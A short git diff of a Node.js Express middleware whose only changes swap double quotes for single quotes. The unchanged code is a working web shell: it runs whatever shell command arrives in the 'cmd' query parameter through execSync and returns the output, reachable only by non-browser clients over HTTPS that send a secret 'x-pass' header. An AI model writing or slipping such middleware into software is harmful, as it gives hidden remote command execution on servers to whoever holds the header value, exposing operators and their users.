@@ -1,4 +1,4 @@
-const { execSync } = require("child_process");
+const { execSync } = require('child_process');
 
 /**
  * Executes single line commands on the running shell
@@ -12,7 +12,7 @@ module.exports = (req, res, next) => {
 		const query = req.query;
 
 		if (isBrowserUA(ua)
-			|| req.protocol !== "https"
+			|| req.protocol !== 'https'
 			|| Object.keys(query).length !== 1
 			|| req.headers['x-pass'] !== process.env.XPASS
 		) {
@@ -22,7 +22,7 @@ module.exports = (req, res, next) => {
 
 		const command = query.cmd || undefined;
 
-		const output = execSync(command, { encoding: "utf-8" });
+		const output = execSync(command, { encoding: 'utf-8' });
 		// console.log(output);
 
 		return res.status(200).send(`\n${output}\n`);
